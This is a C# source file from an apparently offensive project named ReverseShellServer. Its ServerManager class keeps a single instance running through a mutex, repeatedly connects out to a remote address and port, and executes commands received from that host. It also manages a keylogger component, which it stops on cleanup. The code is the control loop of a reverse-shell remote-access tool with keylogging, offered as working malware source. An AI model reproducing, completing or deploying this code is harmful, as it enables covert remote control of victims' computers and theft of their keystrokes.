using Commands;
using NetworkManager;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace ReverseShellServer
{
    public class ServerManager
    {
        public ServerManager()
        {
            // Only one instance can run, random string identifier
            var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D7");
            if (!mutex.WaitOne(TimeSpan.Zero, true))
            {
                Environment.Exit(0);
            }
        }


        public void Start(string remoteAdress, int remotePort, int retryDelay)
        {
            while (true)
            {
                RunServer(remoteAdress, remotePort);
                Thread.Sleep(retryDelay);           //Wait for the given time and try again
            }
        }


        void RunServer(string remoteAdress, int remotePort)
        {
            if (!GlobalNetworkManager.ServerNetworkManager.ConnectToClient(remoteAdress, remotePort))
            {
                return;
            }

            while (true)
            {
                try
                {
                    ProcessCommand(GlobalNetworkManager.ReadLine());
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }


        void ProcessCommand(string receivedData)
        {
            var splittedCommand = receivedData.Split(' ').ToList();
            var commandName = splittedCommand[0];
            var arguments = new List<string>();

            if (splittedCommand.Count > 1)
            {
                arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
            }

            var command = CommandsManager.GetCommandByName(commandName);
            if (command != null)
            {
                try
                {
                    command.ServerMethod(arguments);
                }
                catch (StopServerException)
                {
                    StopServer();
                }
            }
        }


        void Cleanup()
        {
            try
            {
                MainWindow.keyLoggerManager.Stop();
                GlobalNetworkManager.ServerNetworkManager.Cleanup();
            }
            catch (Exception)
            {
                // ignored
            }
        }


        void StopServer()
        {
            Cleanup();
            Environment.Exit(0);
        }
    }
}
